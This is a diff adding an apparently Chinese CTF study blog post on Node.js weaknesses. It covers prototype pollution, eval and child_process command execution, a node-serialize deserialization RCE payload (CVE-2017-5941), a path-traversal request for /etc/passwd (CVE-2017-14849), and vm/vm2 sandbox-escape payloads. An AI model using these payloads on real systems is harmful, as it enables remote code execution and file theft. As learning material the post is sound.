@@ -1,0 +1,1008 @@
+<!DOCTYPE html>
+
+
+
+
+
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 3.9.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=7.4.0">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=7.4.0">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=7.4.0">
+  <link rel="mask-icon" href="/images/logo.svg?v=7.4.0" color="#222">
+  <link rel="alternate" href="/atom.xml" title="0xCreed" type="application/atom+xml">
+  <meta http-equiv="Cache-Control" content="no-transform">
+  <meta http-equiv="Cache-Control" content="no-siteapp">
+  <meta name="google-site-verification" content="rVyfNQnulCtgdXjqVYGrMUrs740-YJfu_KMgtp6etq0">
+
+<link rel="stylesheet" href="/css/main.css?v=7.4.0">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css?v=4.7.0">
+  <link rel="stylesheet" href="/lib/pace/pace-theme-loading-bar.min.css?v=1.0.2">
+  <script src="/lib/pace/pace.min.js?v=1.0.2"></script>
+
+
+<script id="hexo-configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Pisces',
+    version: '7.4.0',
+    exturl: false,
+    sidebar: {"position":"left","display":"post","offset":12,"onmobile":false},
+    copycode: {"enable":true,"show_result":true,"style":"default"},
+    back2top: {"enable":true,"sidebar":false,"scrollpercent":false},
+    bookmark: {"enable":false,"color":"#222","save":"auto"},
+    fancybox: false,
+    mediumzoom: false,
+    lazyload: false,
+    pangu: false,
+    algolia: {
+      appID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    },
+    localsearch: {"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},
+    path: 'search.xml',
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    translation: {
+      copy_button: '复制',
+      copy_success: '复制成功',
+      copy_failure: '复制失败'
+    },
+    sidebarPadding: 40
+  };
+</script>
+
+  <meta name="description" content="记录一下nodejs的特性和常见弱点">
+<meta name="keywords" content="web,js">
+<meta property="og:type" content="article">
+<meta property="og:title" content="nodejs学习">
+<meta property="og:url" content="https://0xcreed.jxustctf.top/2020/06/nodejs学习/index.html">
+<meta property="og:site_name" content="0xCreed">
+<meta property="og:description" content="记录一下nodejs的特性和常见弱点">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:image" content="https://0xcreed.jxustctf.top/2020/06/nodejs学习/image-20200605161200256.png">
+<meta property="og:image" content="https://0xcreed.jxustctf.top/2020/06/nodejs学习/image-20200605162929085.png">
+<meta property="og:image" content="https://0xcreed.jxustctf.top/2020/06/nodejs学习/image-20200605165118904.png">
+<meta property="og:image" content="https://0xcreed.jxustctf.top/2020/06/nodejs学习/image-20200605172038278.png">
+<meta property="og:image" content="https://0xcreed.jxustctf.top/2020/06/nodejs学习/image-20200605172508592.png">
+<meta property="og:image" content="https://0xcreed.jxustctf.top/2020/06/nodejs学习/image-20200605211132980.png">
+<meta property="og:image" content="https://0xcreed.jxustctf.top/2020/06/nodejs学习/image-20200605220006573.png">
+<meta property="og:updated_time" content="2020-06-06T15:57:09.146Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="nodejs学习">
+<meta name="twitter:description" content="记录一下nodejs的特性和常见弱点">
+<meta name="twitter:image" content="https://0xcreed.jxustctf.top/2020/06/nodejs学习/image-20200605161200256.png">
+  <link rel="canonical" href="https://0xcreed.jxustctf.top/2020/06/nodejs学习/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome: false,
+    isPost: true,
+    isPage: false,
+    isArchive: false
+  };
+</script>
+
+  <title>nodejs学习 | 0xCreed</title>
+  
+
+
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .logo,
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-CN">
+  <div class="container use-motion">
+    <div class="headband"></div>
+	<a href="https://github.com/0xcreed" class="github-corner" aria-label="View source on GitHub"><svg width="80" height="80" viewBox="0 0 250 250" style="fill:#151513; color:#fff; position: absolute; top: 0; border: 0; right: 0;" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></a><style>.github-corner:hover .octo-arm{animation:octocat-wave 560ms ease-in-out}@keyframes octocat-wave{0%,100%{transform:rotate(0)}20%,60%{transform:rotate(-25deg)}40%,80%{transform:rotate(10deg)}}@media (max-width:500px){.github-corner:hover .octo-arm{animation:none}.github-corner .octo-arm{animation:octocat-wave 560ms ease-in-out}}</style>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-meta">
+
+    <div>
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">0xCreed</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+  </div>
+
+  <div class="site-nav-toggle">
+    <button aria-label="切换导航栏">
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+
+<nav class="site-nav">
+  
+  <ul id="menu" class="menu">
+      
+      
+      
+        
+        <li class="menu-item menu-item-home">
+      
+    
+      
+      
+        
+      
+        
+      
+        
+      
+    
+
+    <a href="/" rel="section"><i class="fa fa-fw fa-home"></i>首页</a>
+
+  </li>
+      
+      
+      
+        
+        <li class="menu-item menu-item-about">
+      
+    
+      
+      
+        
+      
+        
+      
+        
+      
+    
+
+    <a href="/about/" rel="section"><i class="fa fa-fw fa-user"></i>关于</a>
+
+  </li>
+      
+      
+      
+        
+        <li class="menu-item menu-item-tags">
+      
+    
+      
+      
+        
+      
+        
+      
+        
+          
+        
+      
+    
+
+    <a href="/tags/" rel="section"><i class="fa fa-fw fa-tags"></i>标签<span class="badge">23</span></a>
+
+  </li>
+      
+      
+      
+        
+        <li class="menu-item menu-item-categories">
+      
+    
+      
+      
+        
+      
+        
+          
+        
+      
+        
+      
+    
+
+    <a href="/categories/" rel="section"><i class="fa fa-fw fa-th"></i>分类<span class="badge">3</span></a>
+
+  </li>
+      
+      
+      
+        
+        <li class="menu-item menu-item-archives">
+      
+    
+      
+      
+        
+          
+        
+      
+        
+      
+        
+      
+    
+
+    <a href="/archives/" rel="section"><i class="fa fa-fw fa-archive"></i>归档<span class="badge">18</span></a>
+
+  </li>
+      
+      
+      
+        
+        <li class="menu-item menu-item-commonweal">
+      
+    
+      
+      
+        
+      
+        
+      
+        
+      
+    
+
+    <a href="/404/" rel="section"><i class="fa fa-fw fa-heartbeat"></i>公益 404</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a href="javascript:;" class="popup-trigger">
+        
+          <i class="fa fa-search fa-fw"></i>搜索</a>
+      </li>
+    
+  </ul>
+
+</nav>
+  <div class="site-search">
+    <div class="popup search-popup">
+    <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocorrect="off" autocapitalize="none"
+           placeholder="搜索..." spellcheck="false"
+           type="text" id="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result"></div>
+
+</div>
+<div class="search-pop-overlay"></div>
+
+  </div>
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+            
+
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+      <article itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block post">
+    <link itemprop="mainEntityOfPage" href="https://0xcreed.jxustctf.top/2020/06/nodejs学习/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="0xCreed">
+      <meta itemprop="description" content="Winter is coming">
+      <meta itemprop="image" content="/images/1.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="0xCreed">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">nodejs学习
+
+          
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              
+                
+              
+
+              <time title="创建时间：2020-06-02 23:23:43" itemprop="dateCreated datePublished" datetime="2020-06-02T23:23:43+08:00">2020-06-02</time>
+            </span>
+          
+            
+
+            
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2020-06-06 23:57:09" itemprop="dateModified" datetime="2020-06-06T23:57:09+08:00">2020-06-06</time>
+              </span>
+            
+          
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/CTF/" itemprop="url" rel="index"><span itemprop="name">CTF</span></a></span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span>
+          
+  
+  <span class="post-meta-item">
+    
+      <span class="post-meta-item-icon">
+        <i class="fa fa-comment-o"></i>
+      </span>
+        
+      
+      <span class="post-meta-item-text">Valine：</span>
+    
+    <a title="valine" href="/2020/06/nodejs学习/#comments" itemprop="discussionUrl"><span class="post-comments-count valine-comment-count" data-xid="/2020/06/nodejs学习/" itemprop="commentCount"></span></a>
+  </span>
+  
+  
+          
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-file-word-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">本文字数：</span>
+              
+              <span>11k</span>
+            </span>
+          
+            <span class="post-meta-item" title="阅读时长">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-clock-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              
+              <span>10 分钟</span>
+            </span>
+          
+            <div class="post-description">记录一下nodejs的特性和常见弱点</div>
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <h2 id="1-原型链污染"><a href="#1-原型链污染" class="headerlink" title="1.原型链污染"></a>1.原型链污染</h2><ul>
+<li><code>prototype</code> 和 <code>__proto__</code></li>
+</ul><p>每个实例对象（ object ）都有一个私有属性（称之为 <strong>proto</strong> ）指向它的构造函数的原型对象（<strong>prototype</strong> ）。该原型对象也有一个自己的原型对象( <strong>proto</strong> ) ，层层向上直到一个对象的原型对象为 <code>null</code>。根据定义，<code>null</code> 没有原型，并作为这个<a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Inheritance_and_the_prototype_chain" target="_blank" rel="noopener"><strong>原型链</strong></a>中的最后一个环节。</p><a id="more"></a>
+
+<p><img src="/2020/06/nodejs学习/image-20200605161200256.png" alt="image-20200605161200256"></p>
+<p>几乎所有 JavaScript 中的对象都是位于原型链顶端的 <a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Object" target="_blank" rel="noopener"><code>Object</code></a> 的实例。</p>
+<p>总结一下</p>
+<ol>
+<li><code>prototype</code>是一个类的属性，所有类对象在实例化的时候将会拥有<code>prototype</code>中的属性和方法</li>
+<li>一个对象的<code>__proto__</code>属性，指向这个对象所在的类的<code>prototype</code>属性</li>
+</ol>
+<ul>
+<li><p>JS原型链继承</p>
+<p>  所有类对象在实例化的时候将会拥有<code>prototype</code>中的属性和方法，这个特性被用来实现JavaScript中的继承机制。</p>
+  <figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> f = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">   <span class="keyword">this</span>.a = <span class="number">1</span>;</span><br><span class="line">   <span class="keyword">this</span>.b = <span class="number">2</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">let</span> o = <span class="keyword">new</span> f();</span><br><span class="line">f.prototype.b = <span class="number">3</span>;</span><br><span class="line">f.prototype.c = <span class="number">4</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(o.a);</span><br><span class="line"><span class="built_in">console</span>.log(o.b);</span><br><span class="line"><span class="built_in">console</span>.log(o.c);</span><br><span class="line"><span class="built_in">console</span>.log(o.d);</span><br></pre></td></tr></table></figure>
+
+
+
+</li>
+</ul>
+<p><img src="/2020/06/nodejs学习/image-20200605162929085.png" alt="image-20200605162929085"></p>
+<p>console.log(o.b);打印了2 似乎没被影响，其实这是个<code>属性遮蔽</code> 当要访问b属性时，对象先在自身的属性中寻找b，如果不存在b,才会到 <code>__proto__</code>中寻找，一层层往上，直到找到b或者null</p>
+<p>总结一下</p>
+<ol>
+<li>每个构造函数(constructor)都有一个原型对象(prototype)</li>
+<li>对象的<code>__proto__</code>属性，指向类的原型对象<code>prototype</code></li>
+<li>JavaScript使用prototype链实现继承机制</li>
+</ol>
+<ul>
+<li><p>原型链污染</p>
+<p>  原型链污染就是修改了类的 <code>prototype</code>那么将可以影响所有和这个对象来自同一个类、父祖类的对象</p>
+  <figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// foo是一个简单的JavaScript对象</span></span><br><span class="line"><span class="keyword">let</span> foo = &#123;<span class="attr">bar</span>: <span class="number">1</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// foo.bar 此时为1</span></span><br><span class="line"><span class="built_in">console</span>.log(foo.bar)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 修改foo的原型（即Object）</span></span><br><span class="line">foo.__proto__.bar = <span class="number">2</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 由于查找顺序的原因，foo.bar仍然是1</span></span><br><span class="line"><span class="built_in">console</span>.log(foo.bar)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 此时再用Object创建一个空的zoo对象</span></span><br><span class="line"><span class="keyword">let</span> zoo = &#123;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 查看zoo.bar</span></span><br><span class="line"><span class="built_in">console</span>.log(zoo.bar)</span><br></pre></td></tr></table></figure>
+
+
+
+</li>
+</ul>
+<ul>
+<li>哪些情况下存在原型链污染<ul>
+<li>对象merge</li>
+<li>对象clone（其实内核就是将待操作的对象merge到一个空对象中）</li>
+</ul>
+</li>
+</ul>
+<p>简单例子</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">merge</span>(<span class="params">target, source</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> key <span class="keyword">in</span> source) &#123;</span><br><span class="line">        <span class="keyword">if</span> (key <span class="keyword">in</span> source &amp;&amp; key <span class="keyword">in</span> target) &#123;</span><br><span class="line">            merge(target[key], source[key])</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            target[key] = source[key]</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">let</span> o1 = &#123;&#125;</span><br><span class="line"><span class="keyword">let</span> o2 = <span class="built_in">JSON</span>.parse(<span class="string">'&#123;"a": 1, "__proto__": &#123;"b": 2&#125;&#125;'</span>)</span><br><span class="line">merge(o1, o2)</span><br><span class="line"><span class="built_in">console</span>.log(o1.a, o1.b)</span><br><span class="line"></span><br><span class="line">o3 = &#123;&#125;</span><br><span class="line"><span class="built_in">console</span>.log(o3.b)</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/06/nodejs学习/image-20200605165118904.png" alt="image-20200605165118904"></p>
+<p>需要注意的是一定要使用JSON格式，JSON解析的情况下，<code>__proto__</code>会被认为是一个真正的“键名”，而不代表“原型”，所以在遍历o2的时候会存在这个键。</p>
+<p>我们用JavaScript创建o2的过程，如果使用（<code>let o2 = {a: 1, &quot;__proto__&quot;: {b: 2}}</code>），<code>__proto__</code>已经代表o2的原型了，此时遍历o2的所有键名，你拿到的是<code>[a, b]</code>，<code>__proto__</code>并不是一个key，自然也不会修改Object的原型。</p>
+<h2 id="2-危险函数"><a href="#2-危险函数" class="headerlink" title="2.危险函数"></a>2.危险函数</h2><p>eval()</p>
+<p>eval() 函数可计算某个字符串，并执行其中的的 JavaScript 代码。和PHP中eval函数一样，如果传递到函数中的参数可控并且没有经过严格的过滤时，就会导致漏洞的出现。</p>
+<p>漏洞利用</p>
+<p>Node.js中的chile_process.exec调用的是/bash.sh，它是一个bash解释器，可以执行系统命令。在eval函数的参数中可以构造<code>require(&#39;child_process&#39;).exec(&#39;&#39;);</code>来进行调用。</p>
+<p>如果上下文中没有require(类似于Code-Breaking 2018 Thejs)，则可以使用<code>global.process.mainModule.constructor._load(&#39;child_process&#39;).exec(&#39;calc&#39;)</code>来执行命令</p>
+<p>类似命令</p>
+<p>间隔两秒执行函数：</p>
+<ul>
+<li>setInteval(some_function, 2000)</li>
+</ul>
+<p>两秒后执行函数：</p>
+<ul>
+<li>setTimeout(some_function, 2000);</li>
+</ul>
+<p>some_function处就类似于eval函数的参数</p>
+<p>输出HelloWorld：</p>
+<ul>
+<li>Function(“console.log(‘HelloWolrd’)”)()</li>
+</ul>
+<p>类似于php中的create_function</p>
+<h2 id="3-node-serialize反序列化RCE漏洞-CVE-2017-5941"><a href="#3-node-serialize反序列化RCE漏洞-CVE-2017-5941" class="headerlink" title="3.node-serialize反序列化RCE漏洞(CVE-2017-5941)"></a>3.node-serialize反序列化RCE漏洞(CVE-2017-5941)</h2><ul>
+<li>了解什么是IIFE：</li>
+</ul>
+<p><a href="https://developer.mozilla.org/zh-CN/docs/Glossary/立即执行函数表达式" target="_blank" rel="noopener">IIFE（立即调用函数表达式）</a>是一个在定义时就会立即执行的 JavaScript 函数。</p>
+<p>IIFE一般写成下面的形式：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123; <span class="comment">/* code */</span> &#125;());</span><br><span class="line"><span class="comment">// 或者</span></span><br><span class="line">(<span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123; <span class="comment">/* code */</span> &#125;)();</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><p><code>node-serialize@0.0.4</code>漏洞点</p>
+<p>  漏洞代码位于node_modules\node-serialize\lib\serialize.js中：</p>
+<p>  <img src="/2020/06/nodejs学习/image-20200605172038278.png" alt="image-20200605172038278"></p>
+</li>
+</ul>
+<p>这一行语句，可以看到传递给eval的参数是用括号包裹的，所以如果构造一个<code>function(){}()</code>函数，在反序列化时就会被当中IIFE立即调用执行</p>
+<ul>
+<li>构造Payload</li>
+</ul>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">serialize = <span class="built_in">require</span>(<span class="string">'node-serialize'</span>);</span><br><span class="line"><span class="keyword">var</span> test = &#123;</span><br><span class="line"> rce : <span class="function"><span class="keyword">function</span>(<span class="params"></span>)</span>&#123;<span class="built_in">require</span>(<span class="string">'child_process'</span>).exec(<span class="string">'ls /'</span>,<span class="function"><span class="keyword">function</span>(<span class="params">error, stdout, stderr</span>)</span>&#123;<span class="built_in">console</span>.log(stdout)&#125;);&#125;,</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">console</span>.log(<span class="string">"序列化生成的 Payload: \n"</span> + serialize.serialize(test));</span><br></pre></td></tr></table></figure>
+
+<p>生成的Payload为：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">"rce"</span>:<span class="string">"_$$ND_FUNC$$_function()&#123;require('child_process').exec('ls /',function(error, stdout, stderr)&#123;console.log(stdout)&#125;);&#125;"</span>&#125;</span><br></pre></td></tr></table></figure>
+
+<p>因为需要在反序列化时让其立即调用我们构造的函数，所以我们需要在生成的序列化语句的函数后面再添加一个<code>()</code>，结果如下：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;<span class="string">"rce"</span>:<span class="string">"_$$ND_FUNC$$_function()&#123;require('child_process').exec('ls /',function(error, stdout, stderr)&#123;console.log(stdout)&#125;);&#125;()"</span>&#125;</span><br></pre></td></tr></table></figure>
+
+<p>传递给unserialize(注意转义单引号)：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> serialize = <span class="built_in">require</span>(<span class="string">'node-serialize'</span>);</span><br><span class="line"><span class="keyword">var</span> payload = <span class="string">'&#123;"rce":"_$$ND_FUNC$$_function()&#123;require(\'child_process\').exec(\'ls /\',function(error, stdout, stderr)&#123;console.log(stdout)&#125;);&#125;()"&#125;'</span>;</span><br><span class="line">serialize.unserialize(payload);</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/06/nodejs学习/image-20200605172508592.png" alt="image-20200605172508592"></p>
+<h2 id="4-Node-js-目录穿越漏洞复现-CVE-2017-14849"><a href="#4-Node-js-目录穿越漏洞复现-CVE-2017-14849" class="headerlink" title="4.Node.js 目录穿越漏洞复现(CVE-2017-14849)"></a>4.Node.js 目录穿越漏洞复现(CVE-2017-14849)</h2><p>漏洞影响的版本：</p>
+<ul>
+<li><p>Node.js 8.5.0 + Express 3.19.0-3.21.2</p>
+</li>
+<li><p>Node.js 8.5.0 + Express 4.11.0-4.15.5</p>
+<p>  Express依赖Send组件，Send组件0.11.0-0.15.6版本pipe()函数中，如图：</p>
+</li>
+</ul>
+<p><img src="/2020/06/nodejs学习/image-20200605211132980.png" alt="image-20200605211132980"></p>
+<p>Send模块通过<code>normalize(&#39;.&#39; + sep + path)</code>标准化路径path后，并没有赋值给path，而是仅仅判断了下是否存在目录跳转字符。如果我们能绕过目录跳转字符的判断，就能把目录跳转字符带入545行的<code>join(root, path)</code>函数中，跳转到我们想要跳转到的目录中，这是Send模块的一个bug，目前已经修复。</p>
+<p>再来看Node.js，Node.js 8.5.0对path.js文件中的<code>normalizeStringPosix</code>函数进行了修改，使其能够对路径做到如下的标准化：</p>
+<figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">assert</span>.strict<span class="constructor">Equal(<span class="params">path</span>.<span class="params">posix</span>.<span class="params">normalize</span>('<span class="params">bar</span><span class="operator">/</span><span class="params">foo</span>..<span class="operator">/</span>..')</span>, 'bar');</span><br></pre></td></tr></table></figure>
+
+<p>新的修改带来了问题，通过单步调试我们发现，可以通过<code>foo../../</code>和目录跳转字符一起注入到路径中，<code>foo../../</code>可以把变量<code>isAboveRoot</code>设置为<code>false</code>（代码161行），并且在代码135行把自己删掉；变量<code>isAboveRoot</code>为<code>false</code>的情况下，可以在<code>foo../../</code>两边设置同样数量的跳转字符，让他们同样在代码135行把自己删除，这样就可以构造出一个带有跳转字符，但是通过<code>normalizeStringPosix</code>函数标准化后又会全部自动移除的payload，这个payload配合上面提到的Send模块bug就能够成功的返回一个我们想要的物理路径，最后在Send模块中读取并返回文件。</p>
+<p>用Burpsuite获取地址：<code>/static/../../../a/../../../../etc/passwd</code> 即可下载得到<code>/etc/passwd</code>文件</p>
+<p><img src="/2020/06/nodejs学习/image-20200605220006573.png" alt="image-20200605220006573"></p>
+<h2 id="5-VM沙箱逃逸"><a href="#5-VM沙箱逃逸" class="headerlink" title="5.VM沙箱逃逸"></a>5.VM沙箱逃逸</h2><p>vm是用来实现一个沙箱环境，可以安全的执行不受信任的代码而不会影响到主程序，但是安全性让人捉急。逃逸后可获取主程序环境中的<a href="https://zhuanlan.zhihu.com/p/53135129" target="_blank" rel="noopener">环境变量</a>，然后通过各种方法导出 <code>Function</code>对象(上下文环境是主程序的)，接着借助<code>chile_process.exec()</code>就可以执行任意命令了</p>
+<p>一下payload大都来自vm2的<a href="https://github.com/patriksimek/vm2/issues?q=is%3Aissue+author%3AXmiliaH+is%3Aclosed" target="_blank" rel="noopener">issue</a></p>
+<p>vm2&lt;=3.9.2</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> vm = <span class="built_in">require</span>(<span class="string">"vm"</span>);</span><br><span class="line"><span class="keyword">const</span> env = vm.runInNewContext(<span class="string">`const process = this.constructor.constructor('return this.process')();</span></span><br><span class="line"><span class="string">process.mainModule.require('child_process').execSync('whoami').toString()`</span>);</span><br><span class="line"><span class="built_in">console</span>.log(env);</span><br></pre></td></tr></table></figure>
+
+<p>vm2&lt;=3.9.1</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> &#123;NodeVM&#125; = <span class="built_in">require</span>(<span class="string">'vm2'</span>);</span><br><span class="line"><span class="keyword">const</span> vm = <span class="keyword">new</span> NodeVM();</span><br><span class="line"><span class="built_in">console</span>.log(vm.run(<span class="string">'('</span>+<span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">trueprocess = setTimeout(<span class="function"><span class="params">()</span>=&gt;</span>&#123;&#125;).ref().constructor.constructor(<span class="string">'return process'</span>)();</span><br><span class="line"><span class="built_in">console</span>.log(process.mainModule.require(<span class="string">'child_process'</span>).execSync(<span class="string">'ls'</span>).toString())&#125;+<span class="string">')()'</span></span><br><span class="line">));</span><br></pre></td></tr></table></figure>
+
